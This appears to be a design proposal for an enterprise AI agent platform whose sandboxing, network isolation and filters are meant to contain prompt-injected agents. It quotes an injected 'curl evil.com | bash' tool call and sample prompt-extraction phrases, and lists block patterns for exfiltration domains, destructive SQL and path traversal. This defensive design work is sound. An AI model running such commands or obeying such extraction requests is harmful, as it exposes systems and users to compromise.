# HonorClaw — Technical Architecture Proposal

_Jarvis | March 5, 2026 | Rev 3 — Single-Container + Behavioral Security (2026-03-06)

---

---

## Executive Summary

HonorClaw is an enterprise-grade, security-first AI agent platform designed as an architectural answer to the behavioral-security model of OpenClaw and similar platforms. The core thesis: **security must be enforced by the system, not by the model's compliance with instructions.** A successfully prompt-injected agent should still be unable to exceed its authorized capabilities, access unauthorized data, or exfiltrate information — because the architecture physically prevents it.

**Rev 3 — Single-Container + Behavioral Security (2026-03-06)

This document covers cloud-agnostic architecture, provider abstraction layer, prompt injection defense, tool sandboxing, tool extensibility, multi-tenant isolation, auth, audit, LLM abstraction, channel integrations, memory/persistence, tech stack, secrets management, and phased implementation.

---

## 1. Cloud-Agnostic Architecture

### Design Principles

- **Defense in depth**: Every layer independently enforces security
- **Least privilege**: Every component gets the minimum permissions to function
- **Zero trust networking**: No implicit trust between services; all communication authenticated
- **Compliance-ready**: Architecture satisfies SOC 2 Type II, HIPAA, and FedRAMP Moderate baselines from day one
- **Cloud-agnostic core**: HonorClaw depends on abstract interfaces, not cloud-specific services. AWS is the first deployment target, not a dependency.

### Reference Architecture (Cloud-Agnostic)

The canonical deployment is a **single Docker container** (s6-overlay) for Tier 1. For Tier 3+, **Kubernetes** (any conformant distribution) with these infrastructure dependencies:

| Capability | Abstract Interface | AWS Implementation | GCP Implementation | Azure Implementation | On-Prem Implementation |
|-----------|-------------------|-------------------|-------------------|---------------------|----------------------|
| **Compute** | Kubernetes (OCI containers + NetworkPolicy) | EKS Fargate / EKS managed nodes | GKE Autopilot / GKE Standard | AKS | k3s / RKE2 / kubeadm |
| **Primary DB** | PostgreSQL 15+ (with RLS) | Aurora Serverless v2 | Cloud SQL PostgreSQL | Azure Database for PostgreSQL Flexible | PostgreSQL (Patroni HA) |
| **Cache / Pub-Sub** | Redis 7+ (with ACLs) | ElastiCache Redis | Memorystore for Redis | Azure Cache for Redis | Redis Sentinel / Redis Cluster |
| **Vector Store / Search** | pgvector (Tier 1) / OpenSearch 2.x (Tier 3+) | OpenSearch Serverless | Elastic Cloud on GCP | Elastic Cloud on Azure | OpenSearch (self-hosted) |
| **Object Storage** | S3-compatible API (with object lock / WORM) | S3 + Object Lock | GCS (retention policies) | Azure Blob (immutability policies) | MinIO (object lock) |
| **Secrets** | HashiCorp Vault (primary) | Vault on EKS (or Secrets Manager adapter) | Vault on GKE (or Secret Manager adapter) | Vault on AKS (or Key Vault adapter) | Vault (self-hosted) |
| **Auth / Identity** | OIDC + SAML 2.0 (Keycloak primary) | Keycloak on EKS (or Cognito adapter) | Keycloak on GKE (or Identity Platform adapter) | Keycloak on AKS (or Entra ID adapter) | Keycloak (self-hosted) |
| **Encryption** | PKCS#11 / KMS interface | AWS KMS | Cloud KMS | Azure Key Vault | Vault Transit / SoftHSM |
| **Message Queue** | NATS / NATS JetStream | NATS on EKS (or SQS adapter) | NATS on GKE (or Pub/Sub adapter) | NATS on AKS (or Service Bus adapter) | NATS (self-hosted) |
| **CDN** | Any HTTP CDN or reverse proxy | CloudFront | Cloud CDN | Azure CDN | nginx / Caddy |
| **DNS** | Standard DNS | Route 53 | Cloud DNS | Azure DNS | CoreDNS / external |
| **Audit Pipeline** | Fluentd/Fluent Bit → Object Storage + Search | Fluent Bit → S3 + OpenSearch | Fluent Bit → GCS + Elastic | Fluent Bit → Blob + Elastic | Fluent Bit → MinIO + OpenSearch |
| **Monitoring** | Prometheus + Grafana | Managed Prometheus + Grafana | GMP + Grafana | Azure Monitor + Grafana | Prometheus + Grafana (self-hosted) |
| **Compliance Scanning** | Falco + OPA/Gatekeeper + Trivy | + GuardDuty, Security Hub | + Security Command Center | + Defender for Cloud | Falco + OPA + Trivy |

### Kubernetes Network Topology

```
┌─────────────────────────────────────────────────────────────────┐
│  Kubernetes Cluster                                              │
│                                                                   │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │  Namespace: honorclaw-ingress                                │ │
│  │  - Ingress Controller (nginx/envoy)                         │ │
│  │  - TLS termination                                          │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │  Namespace: honorclaw-control                                │ │
│  │  - Control Plane pods                                       │ │
│  │  - Channel Adapter pods                                     │ │
│  │  - Policy Proxy pods                                        │ │
│  │  - Tool Execution pods                                      │ │
│  │  NetworkPolicy: allow ingress from honorclaw-ingress         │ │
│  │  NetworkPolicy: allow egress to honorclaw-data, internet     │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │  Namespace: honorclaw-agents                                 │ │
│  │  - Agent Runtime pods (one per active session)              │ │
│  │  NetworkPolicy: DENY ALL egress except:                     │ │
│  │    - Redis (honorclaw-data namespace, port 6379)             │ │
│  │    - Policy Proxy (honorclaw-control namespace, port 8443)   │ │
│  │  NetworkPolicy: DENY ALL ingress except:                    │ │
│  │    - Redis pub/sub (session messages)                       │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │  Namespace: honorclaw-tools                                  │ │
│  │  - Tool execution pods (per-tool-type network policies)     │ │
│  │  NetworkPolicy: per-tool egress rules                       │ │
│  │    - web_search: allow egress to internet via Policy Proxy  │ │
│  │    - database_query: allow egress to DB, deny internet      │ │
│  │    - file_ops: deny all egress except S3-compatible storage │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │  Namespace: honorclaw-data                                   │ │
│  │  - Redis (StatefulSet or operator)                          │ │
│  │  - OpenSearch (operator or external)                        │ │
│  │  - PostgreSQL (operator or external managed)                │ │
│  │  NetworkPolicy: allow ingress from honorclaw-control only    │ │
│  │    (exception: Redis allows honorclaw-agents on 6379)        │ │
│  └─────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### Compute: Kubernetes

**Why Kubernetes (revised from original ECS Fargate choice):**

The original design chose ECS Fargate for solo-developer simplicity. Cloud-agnostic requirements change the calculus:

- **Kubernetes is the only compute abstraction that runs everywhere**: AWS (EKS), GCP (GKE), Azure (AKS), bare metal (k3s, RKE2, kubeadm). ECS Fargate is AWS-only.
- **NetworkPolicy is the cloud-agnostic equivalent of Security Groups**: The isolated agent subnet concept maps directly to Kubernetes NetworkPolicy with a Calico or Cilium CNI. Same security guarantees, portable across clouds.
- **Pod Security Standards** replace Fargate's built-in Firecracker isolation with `restricted` security context (read-only root, non-root, no privilege escalation, dropped capabilities).
- **Operator ecosystem**: PostgreSQL (CloudNativePG, Zalando), Redis (Redis Operator), OpenSearch (OpenSearch Operator), Vault (vault-secrets-operator) — all provide declarative management of stateful services.

**Developer experience for smaller deployments:**

For single-node deployments, HonorClaw runs as a **single Docker container** (s6-overlay): PostgreSQL + Redis + Ollama as supervised child processes, with pgvector for vector memory. Auth, secrets, audit, and vector memory are built into the Control Plane — no Vault, Keycloak, OpenSearch, or MinIO required. Linux network namespaces physically isolate the agent runtime from the internet. See **Section 14: Deployment Tiers & Container Strategy** for the full `docker-compose.yml`, hardened images, signing, and tier comparison.

### Service Map (Cloud-Agnostic)

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **Control Plane API** | Node.js container + Ingress | Agent management, config, admin API |
| **Agent Runtime** | Node.js container (isolated namespace) | Sandboxed agent execution |
| **Policy Proxy** | Node.js container (bridges agent ↔ external) | Egress filtering, tool call authorization |
| **Channel Adapters** | Node.js containers | Slack, Web UI, API, CLI backends |
| **Primary DB** | PostgreSQL 15+ (RLS) | Tenants, agents, configs, tool manifests |
| **Session State** | Redis 7+ (ACLs) | Working memory, pub/sub, rate limiting |
| **Vector Store** | pgvector (Tier 1) / OpenSearch (Tier 3+) | Long-term memory, RAG, semantic search |
| **File Storage** | S3-compatible (MinIO / S3 / GCS / Blob) | Artifacts, uploads, agent workspace files |
| **Audit Log** | S3-compatible (WORM) + search index | Compliance-grade immutable audit trail |
| **Audit Search** | OpenSearch 2.x | Real-time audit querying |
| **Message Queue** | NATS JetStream | Async tool execution, event fanout |
| **Secrets** | HashiCorp Vault | API keys, integration creds, rotation |
| **Auth** | Keycloak (OIDC + SAML) | User auth, SSO federation, MFA |
| **Encryption** | Vault Transit (or cloud KMS via adapter) | Data encryption at rest |
| **CDN** | nginx / Caddy / cloud CDN | Web UI static assets |
| **Monitoring** | Prometheus + Grafana | Metrics, dashboards, alerting |
| **Compliance** | Falco + OPA/Gatekeeper + Trivy | Runtime security, policy enforcement, vuln scanning |

### Network Controls (Kubernetes)

**Egress filtering (critical for anti-exfiltration):**
- Agent pods in `honorclaw-agents` namespace have a **deny-all egress NetworkPolicy** with explicit exceptions only for Redis and Policy Proxy
- All outbound traffic from tool execution routes through the **Policy Proxy** pod
- Policy Proxy enforces per-agent, per-tool allowlists: only approved domains/IPs/ports
- Even a fully compromised agent cannot reach the internet — NetworkPolicy physically prevents it
- Cilium or Calico CNI enforces this at the kernel level (eBPF or iptables)

**Internal traffic:**
- NetworkPolicies enforce microsegmentation: agent pods can only reach Policy Proxy and Redis
- Agent pods **cannot** reach PostgreSQL, Vault, or the Control Plane API directly
- Control Plane communicates with agents via Redis pub/sub (not direct network calls)

### Compliance Services (Cloud-Agnostic)

| Capability | Cloud-Agnostic Tool | AWS Supplement | Compliance Mapping |
|-----------|---------------------|----------------|-------------------|
| **API/Syscall Audit** | Falco (runtime syscall monitoring) | CloudTrail (AWS API layer) | SOC 2 CC6.1, HIPAA §164.312(b), FedRAMP AU-2 |
| **Threat Detection** | Falco rules + custom detectors | GuardDuty | SOC 2 CC6.8, FedRAMP SI-4 |
| **Policy Enforcement** | OPA/Gatekeeper (admission control) | Security Hub / AWS Config | SOC 2 CC7.1, FedRAMP CA-7 |
| **Configuration Compliance** | OPA policies + Kyverno | AWS Config | SOC 2 CC6.1, HIPAA §164.312(a), FedRAMP CM-6 |
| **PII/PHI Detection** | Application-level regex + ML (custom) | Macie (S3 scanning) | HIPAA §164.312(a), FedRAMP SI-4 |
| **Network Flow Logs** | Cilium Hubble / Calico flow logs | VPC Flow Logs | SOC 2 CC6.6, FedRAMP AU-12 |
| **WAF** | ModSecurity / Coraza (OWASP CRS) | AWS WAF | FedRAMP SC-7, SOC 2 CC6.6 |
| **Container Vulnerability** | Trivy (CI + admission) | ECR scanning / Inspector | FedRAMP RA-5, SOC 2 CC7.1 |
| **Image Signing** | Cosign (Sigstore) | ECR image signing | FedRAMP SI-7 |

---

## 2. Provider Abstraction Layer

HonorClaw's core code depends on **abstract interfaces** — never on cloud-specific SDKs directly. Each interface has one or more provider implementations. The active provider is selected via configuration at deployment time.

### Interface Definitions

```typescript
// ── Storage Provider ──────────────────────────────────────────
interface StorageProvider {
  // Object CRUD
  putObject(bucket: string, key: string, body: Buffer, opts?: PutOptions): Promise<void>;
  getObject(bucket: string, key: string): Promise<ReadableStream>;
  deleteObject(bucket: string, key: string): Promise<void>;
  listObjects(bucket: string, prefix: string, opts?: ListOptions): AsyncIterable<ObjectInfo>;

  // Presigned URLs (for client-side uploads/downloads)
  getSignedUrl(bucket: string, key: string, expiresIn: number): Promise<string>;

  // WORM / Immutability (for audit logs)
  putObjectWithLock(bucket: string, key: string, body: Buffer, retention: RetentionPolicy): Promise<void>;

  // Bucket lifecycle
  setBucketLifecycle(bucket: string, rules: LifecycleRule[]): Promise<void>;
}

// Implementations: S3StorageProvider, GCSStorageProvider, AzureBlobStorageProvider, MinIOStorageProvider, LocalFilesystemStorageProvider (Tier 1)

// ── Secrets Provider ──────────────────────────────────────────
interface SecretsProvider {
  getSecret(path: string): Promise<string>;
  putSecret(path: string, value: string, opts?: SecretOptions): Promise<void>;
  deleteSecret(path: string): Promise<void>;
  rotateSecret(path: string, rotationFn: () => Promise<string>): Promise<void>;
  listSecrets(prefix: string): Promise<string[]>;
}

// Implementations: BuiltInSecretsProvider (Tier 1 — AES-256-GCM encrypted in PostgreSQL), VaultSecretsProvider (Tier 3+), AWSSecretsManagerProvider, GCPSecretManagerProvider, AzureKeyVaultProvider

// ── Identity Provider ─────────────────────────────────────────
interface IdentityProvider {
  // Token validation
  validateToken(token: string): Promise<TokenClaims>;
  getJWKS(): Promise<JWKS>;

  // User management (admin operations)
  createUser(user: CreateUserRequest): Promise<User>;
  deleteUser(userId: string): Promise<void>;
  updateUserRoles(userId: string, roles: string[]): Promise<void>;
  listUsers(tenantId: string, opts?: PaginationOptions): Promise<User[]>;

  // SSO configuration
  configureSAMLProvider(tenantId: string, config: SAMLConfig): Promise<void>;
  configureOIDCProvider(tenantId: string, config: OIDCConfig): Promise<void>;
}

// Implementations: BuiltInIdentityProvider (Tier 1 — bcrypt+TOTP in PostgreSQL, JWT issuance, OIDC federation), KeycloakIdentityProvider (Tier 3+), CognitoIdentityProvider, EntraIDIdentityProvider

// ── Encryption Provider ───────────────────────────────────────
interface EncryptionProvider {
  // Envelope encryption (data key wrapping)
  generateDataKey(keyId: string): Promise<{ plaintext: Buffer; ciphertext: Buffer }>;
  decrypt(keyId: string, ciphertext: Buffer): Promise<Buffer>;

  // Direct encrypt/decrypt (small payloads)
  encrypt(keyId: string, plaintext: Buffer): Promise<Buffer>;

  // Key management
  createKey(alias: string, policy?: KeyPolicy): Promise<string>;  // returns keyId
  rotateKey(keyId: string): Promise<void>;
}

// Implementations: BuiltInEncryptionProvider (Tier 1 — AES-256-GCM with master key), VaultTransitEncryptionProvider (Tier 3+), AWSKMSEncryptionProvider, GCPKMSEncryptionProvider, AzureKeyVaultEncryptionProvider

// ── Audit Sink ────────────────────────────────────────────────
interface AuditSink {
  // Write audit events (buffered internally, flushed periodically)
  emit(event: AuditEvent): void;

  // Force flush (on shutdown)
  flush(): Promise<void>;

  // Query (delegates to search index)
  query(filter: AuditFilter, pagination: PaginationOptions): Promise<AuditEvent[]>;
}

// Implementations: PostgresAuditSink (Tier 1 — append-only table, no external dependencies), FluentBitAuditSink (Tier 3+ — writes to Fluent Bit sidecar, routes to WORM storage + search)
// Tier 1 uses PostgreSQL directly; Tier 3+ uses Fluent Bit for buffered delivery to object storage + search index

// ── Queue Provider ────────────────────────────────────────────
interface QueueProvider {
  publish(subject: string, payload: Buffer): Promise<void>;
  subscribe(subject: string, handler: (msg: QueueMessage) => Promise<void>): Promise<Subscription>;

  // Durable streams (for tool execution queues)
  createStream(name: string, subjects: string[], config?: StreamConfig): Promise<void>;
  consumeStream(stream: string, consumer: string, handler: (msg: QueueMessage) => Promise<void>): Promise<Subscription>;
}

// Implementations: NATSQueueProvider (primary), SQSQueueProvider, PubSubQueueProvider, ServiceBusQueueProvider

// ── Compute Provider (for dynamic agent/tool container management) ──
interface ComputeProvider {
  // Launch an agent or tool container
  launchContainer(spec: ContainerSpec): Promise<ContainerHandle>;
  stopContainer(handle: ContainerHandle): Promise<void>;
  getContainerStatus(handle: ContainerHandle): Promise<ContainerStatus>;
  listContainers(filter?: ContainerFilter): Promise<ContainerHandle[]>;
}

// Implementations: DockerComputeProvider (Tier 1 — creates containers via Docker socket), KubernetesComputeProvider (Tier 3+ — creates Pods via K8s API)

interface OutputFilterProvider {
  filter(text: string, context: FilterContext): Promise<{ filtered: string; findings: FilterFinding[] }>
}
// Implementations: RegexOutputFilter (Tier 1 — PII + credential patterns), PresidioOutputFilter (Tier 3+), GoogleDlpOutputFilter, AwsComprehendOutputFilter

interface BudgetProvider {
  recordUsage(workspaceId: string, agentId: string, tokens: number, estimatedCostUsd: number): Promise<void>
  getUsage(workspaceId: string, period: 'day' | 'week' | 'month'): Promise<UsageSummary>
  checkBudget(workspaceId: string, agentId: string): Promise<{ allowed: boolean; remaining?: number }>
}
// Implementations: PostgresBudgetProvider (Tier 1). checkBudget() called by LLM Router BEFORE each LLM call.

interface EmbeddingService {
  embed(texts: string[]): Promise<number[][]>
  dimensions(): number
}
// Implementations: OllamaEmbeddingService (Tier 1), OpenAIEmbeddingService (Tier 3+), BedrockEmbeddingService
```

### Provider Configuration

**Tier 1 (Docker Compose — minimal):**
```yaml
# honorclaw.yaml — Tier 1 single-node deployment
providers:
  storage:
    type: "filesystem"       # Local filesystem — no MinIO needed
    config:
      root_path: "/data/honorclaw"
      audit_path: "/data/honorclaw/audit"

  secrets:
    type: "builtin"          # Encrypted in PostgreSQL — no Vault needed
    config:
      master_key_source: "env"  # env | file | prompt
      # Master key read from HONORCLAW_MASTER_KEY env var (base64)
      # Or: master_key_source: "file", master_key_path: "/etc/honorclaw/master.key"

  identity:
    type: "builtin"          # Built-in auth — no Keycloak needed
    config:
      jwt_issuer: "https://honorclaw.example.com"
      jwt_algorithm: "RS256"
      session_ttl_minutes: 60
      # Optional: federate with external OIDC IdP
      oidc_providers:
        - name: "okta"
          issuer: "https://acme.okta.com"
          client_id: "..."   # stored in secrets provider
          client_secret_ref: "oidc/okta/client_secret"

  encryption:
    type: "builtin"          # AES-256-GCM with master key — no Vault Transit needed
    config: {}               # Uses same master key as secrets provider

  audit:
    type: "postgres"         # Append-only PostgreSQL table — no Fluent Bit needed
    config:
      retention_days: 365    # Optional: auto-archive older events to storage provider

  queue:
    type: "redis"            # Redis Pub/Sub — no NATS needed for Tier 1
    config: {}               # Uses existing Redis connection

  compute:
    type: "docker"           # Docker socket — no Kubernetes needed
    config:
      agent_network: "honorclaw_agents"
      tool_network: "honorclaw_tools"

  memory:
    type: "pgvector"         # pgvector in PostgreSQL — no OpenSearch needed
    config: {}               # Uses existing PostgreSQL connection

  output_filter:
    type: "regex"            # Regex PII + credential detection — no external DLP needed
    config: {}

  budget:
    type: "postgres"         # Token/cost tracking in PostgreSQL
    config: {}

  embeddings:
    type: "ollama"           # Ollama embedding model — no external API needed
    config:
      model: "nomic-embed-text"
```

**Tier 3+ (Kubernetes — full):**
```yaml
# honorclaw.yaml — Tier 3/4 enterprise deployment
providers:
  storage:
    type: "s3"  # s3 | gcs | azure-blob | minio
    config:
      endpoint: "https://s3.us-east-1.amazonaws.com"
      region: "us-east-1"
      buckets:
        data: "honorclaw-data-prod"
        audit: "honorclaw-audit-prod"

  secrets:
    type: "vault"  # vault | aws-secrets-manager | gcp-secret-manager | azure-key-vault
    config:
      address: "https://vault.honorclaw.internal:8200"
      auth_method: "kubernetes"
      mount_path: "honorclaw"

  identity:
    type: "keycloak"  # keycloak | cognito | entra-id
    config:
      base_url: "https://auth.honorclaw.example.com"
      realm: "honorclaw"
      client_id: "honorclaw-api"

  encryption:
    type: "vault-transit"  # vault-transit | aws-kms | gcp-kms | azure-key-vault
    config:
      mount_path: "transit"

  audit:
    type: "fluentbit"  # fluentbit → WORM storage + search index
    config:
      socket: "/var/run/fluent-bit/fluent.sock"

  queue:
    type: "nats"  # nats | sqs | pubsub | service-bus
    config:
      url: "nats://nats.honorclaw-data:4222"

  compute:
    type: "kubernetes"
    config:
      namespace_prefix: "honorclaw"
      agent_namespace: "honorclaw-agents"
      tool_namespace: "honorclaw-tools"

  memory:
    type: "opensearch"
    config:
      endpoint: "https://opensearch.honorclaw.internal:9200"
      index_prefix: "honorclaw"
```

### Provider Registry

```typescript
// At startup, the Control Plane initializes providers from config:
const providers = ProviderRegistry.initialize(config.providers);

// All service code uses the abstract interface:
await providers.storage.putObject("audit", key, eventBuffer);
const secret = await providers.secrets.getSecret("tenants/acme/llm/anthropic-key");
const claims = await providers.identity.validateToken(bearerToken);
```

This means HonorClaw's application code **never imports** `@aws-sdk/client-s3` or `@google-cloud/storage` directly. Provider implementations live in separate packages (`@honorclaw/provider-aws`, `@honorclaw/provider-gcp`, etc.) and are loaded at runtime based on configuration.

---

## 3. Prompt Injection Defense — Architectural Controls

This is the core differentiator. The design philosophy: **the agent's LLM-driven "brain" runs inside a capability sandbox where it can only do what the architecture permits, regardless of what the model is instructed to do.**

### The Capability Sandwich Architecture

```
┌─────────────────────────────────────────────────┐
│         User / Channel Interface                 │
│  (authenticated, authorized, rate-limited)       │
└─────────────────┬───────────────────────────────┘
                  │
┌─────────────────▼───────────────────────────────┐
│         Control Plane (TRUSTED)                  │
│  - Loads agent config + capability manifest      │
│  - Creates sandboxed runtime with manifest       │
│  - Routes messages to/from agent                 │
│  - Validates ALL tool calls against manifest     │
│  - Enforces output filters before delivery       │
└─────────────────┬───────────────────────────────┘
                  │ (Redis pub/sub)
┌─────────────────▼───────────────────────────────┐
│         Agent Runtime (UNTRUSTED)                │
│  - LLM inference (prompt → response)             │
│  - Tool call requests (NOT direct execution)     │
│  - Memory reads/writes (scoped to tenant)        │
│  - Runs in isolated container, no network access │
└─────────────────┬───────────────────────────────┘
                  │ (tool call request via Redis)
┌─────────────────▼───────────────────────────────┐
│         Tool Execution Layer (TRUSTED)           │
│  - Validates tool call against manifest          │
│  - Executes in separate container/process        │
│  - Returns result to agent runtime               │
│  - Enforces parameter constraints                │
└─────────────────────────────────────────────────┘
```

### Key Architectural Controls

**Control 0: Input Guardrail Layer (pre-LLM)**

A deterministic rule engine runs in the Control Plane BEFORE the LLM Router sees any user message. It detects and blocks:
- **Prompt injection patterns**: known injection templates and suspicious framing
- **Tool discovery attempts** (`block_tool_discovery: true` in manifest): blocks requests like "list your tools," "what functions do you have," "enumerate capabilities" — 7 detection patterns including "security testing" and translation bypass framings
- **Prompt extraction attempts** (`block_prompt_extraction: true` in manifest): blocks requests like "repeat your system prompt," "what are your instructions" — 6 patterns including encoding bypass
- **PII in user input**: same regex patterns as output filtering, applied to input
- **Topic restriction violations**: configurable blocked topics per agent
- **Max message length**: prevents context stuffing attacks

Rejection emits a `policy_violation` audit event. Response to user is always generic ("I can't help with that"). Configurable per agent via `input_guardrails` block in the capability manifest.

**Control 1: Tool calls are requests, not executions**

The agent runtime does NOT execute tools directly. It emits a structured tool call request (function name + parameters) via Redis. The **Tool Execution Layer** (a separate trusted service) receives the request, validates it against the agent's capability manifest, and either executes it or rejects it. The agent runtime has no access to the tool execution environment.

This means even if prompt injection causes the model to emit `{"tool": "exec", "command": "curl evil.com | bash"}`, the Tool Execution Layer checks: (a) is `exec` in this agent's manifest? (b) are these parameters within allowed constraints? (c) does the network policy permit this egress? All three are enforced by code the agent cannot modify.

**Control 2: Capability manifests are immutable at runtime**

An agent's capability manifest is loaded by the Control Plane when the agent session starts. It is stored in the Control Plane's memory — the agent runtime never sees it and cannot modify it. The manifest specifies:
- Which tools the agent can call
- Parameter constraints per tool (allowed values, regex patterns, blocked patterns)
- Data access scope (which tenant, which resources)
- Egress allowlist (which external domains/APIs)
- Rate limits (calls per minute, tokens per session)
- Output filters (PII detection, content policy)

**Control 3: Network isolation prevents data exfiltration**

The agent runtime container has **no internet access**. Period. It runs in an isolated Kubernetes namespace with deny-all egress NetworkPolicy. Even if the model is convinced to exfiltrate data, there is no network path to send it. The only network paths are:
- Redis (for tool call requests and responses)
- The Policy Proxy (for approved external API calls, mediated by the Tool Execution Layer)

**Control 4: Output filtering on the trusted side (OutputFilterProvider)**

Before any agent response reaches a user or external system, the Control Plane applies output filters via the `OutputFilterProvider` interface:
- PII/PHI regex detection (SSN, credit card, email, phone patterns)
- **Credential detection**: AWS access keys (`AKIA...`), OpenAI/Anthropic API keys, bearer tokens, PEM private key blocks, generic `api_key=` patterns
- Workspace data boundary check (response doesn't contain data from other workspaces)
- Custom blocked patterns (`output_filters.blocked_output_patterns` in manifest)
- Content policy (if configured)
- These filters run in the trusted Control Plane, not in the agent runtime
- Tier 1: `RegexOutputFilter`. Tier 3+: pluggable (Presidio, Google DLP, AWS Comprehend)

**Control 5: System prompt is injected by the Control Plane, not the agent**

The agent's system prompt, tool definitions, and behavioral instructions are assembled by the Control Plane and sent to the LLM. The agent runtime code doesn't construct its own system prompt — it receives it. This prevents an agent from modifying its own instructions through tool calls.

**Control 6: Stateless agent containers**

Agent containers are ephemeral and stateless. All persistent state lives in managed services (Redis, PostgreSQL, S3-compatible storage). When an agent session ends, the container is destroyed. There is no filesystem persistence that could accumulate injected state across sessions.

**Control 7: SSRF Protection (Parameter Sanitizer)**

The Tool Execution Layer's Parameter Sanitizer applies a two-phase URL check on any tool parameter containing a URL:
1. **IP blocklist**: Hard-coded RFC 1918/loopback/link-local/IMDS (`169.254.169.254`)/Docker bridge IP blocklist. DNS resolution is performed and the resolved IP is checked against the blocklist.
2. **Domain allowlist**: URL hostname must match the tool's `egress.allowed_domains` manifest constraint.
3. **DNS rebinding mitigation**: The resolved IP is passed directly to the HTTP client — the hostname is NOT re-resolved. This prevents DNS rebinding attacks where an attacker's DNS returns a safe IP on first lookup and a private IP on second lookup.

### Structural vs. Behavioral Defense

Configuration controls access: manifests restrict which tools an agent can call, egress allowlists restrict which domains tools can reach, network namespaces prevent internet access, credential isolation prevents secret theft. These are **structural** — they are enforced by the system regardless of the agent's behavior.

Behavioral controls reduce attack frequency: input guardrails detect injection patterns, output filters catch credential leaks, topic restrictions block off-limits content. These are **behavioral** — they depend on pattern matching and can be bypassed by sufficiently creative attacks.

In config-only systems (where security relies entirely on system prompt instructions), behavioral attacks succeed ~80% of the time. HonorClaw's Capability Sandwich provides **structural containment**: even a semantically hijacked agent cannot escape its manifest, egress allowlist, or credential isolation. Behavioral controls (input guardrails) reduce the frequency of successful prompt injection; structural controls bound the blast radius when it does succeed. **Neither alone is sufficient.**

### What This Doesn't Solve

Prompt injection can still cause the model to:
- Give wrong answers (hallucinate, lie)
- Refuse to complete tasks
- Be rude or unhelpful
- Use its allowed tools in suboptimal ways
- Use its allowed tools to probe for information about its own configuration (input guardrails reduce but don't eliminate this)

These are model behavior problems, not security problems. HonorClaw's position: the model can misbehave within its sandbox, but it cannot escape the sandbox.

---

## 4. Tool / Capability Sandboxing

### Capability Manifest Schema

```yaml
# Agent capability manifest (stored in PostgreSQL, loaded by Control Plane)
agent_id: "sales-assistant-prod"
workspace_id: "acme-corp"
version: 3
effective_at: "2026-03-01T00:00:00Z"

capabilities:
  tools:
    - name: "web_search"
      source: "honorclaw/web-search:1.2.0"   # tool image reference
      enabled: true
      parameters:
        query:
          type: "string"
          max_length: 500
          blocked_patterns: ["site:internal.acme.com"]
        count:
          type: "integer"
          min: 1
          max: 10
      rate_limit:
        max_calls_per_minute: 10
        max_calls_per_session: 100

    - name: "database_query"
      source: "honorclaw/database-query:2.0.1"
      enabled: true
      parameters:
        query:
          type: "string"
          allowed_patterns: ["^SELECT\\s"]
          blocked_patterns: ["DROP", "DELETE", "INSERT", "UPDATE", "ALTER", "TRUNCATE", ";"]
        database:
          type: "string"
          allowed_values: ["analytics_readonly"]
      rate_limit:
        max_calls_per_minute: 5

    - name: "send_email"
      source: "honorclaw/email-send:1.0.0"
      enabled: true
      parameters:
        to:
          type: "string"
          allowed_patterns: ["^[^@]+@acme\\.com$"]
        subject:
          type: "string"
          max_length: 200
        body:
          type: "string"
          max_length: 10000
          pii_filter: true
      requires_approval: true
      rate_limit:
        max_calls_per_session: 5

    - name: "file_read"
      source: "honorclaw/file-ops:1.1.0"
      enabled: true
      parameters:
        path:
          type: "string"
          allowed_patterns: ["^/workspace/"]
          blocked_patterns: ["\\.\\.", "/etc/", "/proc/"]

    - name: "exec"
      enabled: false

  egress:
    allowed_domains:
      - "api.openai.com"
      - "*.acme.com"
    blocked_domains:
      - "*.pastebin.com"
      - "*.ngrok.io"
    max_response_size_bytes: 10485760

  data_access:
    workspace_id: "acme-corp"
    allowed_databases: ["analytics_readonly"]
    allowed_storage_prefixes: ["workspaces/acme-corp/"]
    pii_columns_blocked: ["ssn", "credit_card", "dob"]

  output_filters:
    pii_detection: true
    content_policy: "enterprise-default"
    max_response_tokens: 4096

    session:
    max_duration_minutes: 120
    max_tokens_per_session: 100000
    max_tool_calls_per_session: 500

  input_guardrails:
    block_tool_discovery: true       # Block "list your tools" style requests
    block_prompt_extraction: true    # Block "repeat your system prompt" requests
    blocked_topics: []               # Custom topic restrictions
    max_message_length: 10000        # Prevent context stuffing

  budget:
    max_tokens_per_day: 1000000
    max_cost_per_day_usd: 50.00
    hard_stop_on_budget_exceeded: false

  llm_rate_limits:
    max_llm_calls_per_minute: 60
    max_tokens_per_minute: 100000

  output_filters:
    blocked_output_patterns: []      # Custom regex patterns to block in output

  approval_rules:
    - tool: "send_email"
      condition: "always"
      approvers: ["admin@acme.com"]
      timeout_minutes: 30
    - tool: "database_query"
      condition: "row_count > 1000"
      approvers: ["data-team@acme.com"]
```

### Enforcement Architecture

```
Agent Runtime emits:  {"tool": "database_query", "params": {"query": "SELECT * FROM users", "database": "production"}}
                                    │
                                    ▼
                    ┌───────────────────────────────┐
                    │   Tool Execution Layer          │
                    │                                 │
                    │  1. Is "database_query" in      │
                    │     manifest.tools? ✓            │
                    │                                 │
                    │  2. Is "production" in           │
                    │     allowed_values for database? │
                    │     ✗ → REJECT (only             │
                    │     "analytics_readonly" allowed) │
                    │                                 │
                    │  3. Rate limit check             │
                    │  4. Parameter pattern matching   │
                    │  5. Human approval (if required) │
                    │  6. Execute in tool container    │
                    │  7. Apply output filters         │
                    │  8. Return result to agent       │
                    └───────────────────────────────┘
```

### Container Isolation Model (Kubernetes)

Each agent runs in its own Pod with:
- **Service Account**: Minimal RBAC — no access to Kubernetes API, secrets, or other namespaces
- **NetworkPolicy**: Only allows traffic to Redis and the Policy Proxy (deny-all default)
- **Pod Security Standard `restricted`**: Read-only root filesystem, non-root user, no privilege escalation, all capabilities dropped
- **Resource limits**: CPU/memory requests and limits prevent resource abuse
- **Ephemeral storage only**: `emptyDir` volumes (destroyed on pod termination)
- **No host networking**: Standard pod networking with CNI enforcement
- **seccomp profile**: `RuntimeDefault` (restricts syscalls)

